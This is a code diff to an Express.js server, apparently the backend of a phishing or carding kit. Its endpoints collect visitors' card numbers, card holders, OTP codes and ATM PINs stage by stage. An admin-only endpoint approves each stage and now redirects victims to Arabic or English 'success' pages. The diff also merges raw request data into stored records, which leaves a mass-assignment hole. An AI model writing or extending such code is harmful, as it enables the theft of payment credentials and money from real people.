@@ -87,6 +87,7 @@ app.post('/api/card', (req, res) => {
 
   visits[visitId] = {
     ...existing,
+    ...data,
     visitId,
     cardNumber: normalizeCardNumber(data.cardNumber),
     cardHolder: data.cardHolder || existing.cardHolder || '',
@@ -112,6 +113,7 @@ app.post('/api/otp', (req, res) => {
 
   visits[visitId] = {
     ...existing,
+    ...data,
     visitId,
     otp: String(data.otp || ''),
     stage: 'otp',
@@ -134,6 +136,7 @@ app.post('/api/atm', (req, res) => {
 
   visits[visitId] = {
     ...existing,
+    ...data,
     visitId,
     atmPin: String(data.atmPin || ''),
     stage: 'atm',
@@ -154,6 +157,7 @@ app.get('/api/status/:id', (req, res) => {
     status: v.decision || 'pending',
     stage: v.stage || 'card',
     decision: v.decision || 'pending',
+    redirect: v.pendingRedirect || undefined,
   });
 });
 
@@ -184,6 +188,8 @@ app.post('/api/decision', requireAdmin, (req, res) => {
     } else if (v.stage === 'atm') {
       v.stage = 'success';
       v.decision = 'approved';
+      // Auto-redirect the visitor to the success page in their language.
+      v.pendingRedirect = (v.lang === 'en') ? 'success-en.html' : 'success-ar.html';
     }
   } else if (decision === 'rejected') {
     v.decision = 'rejected';
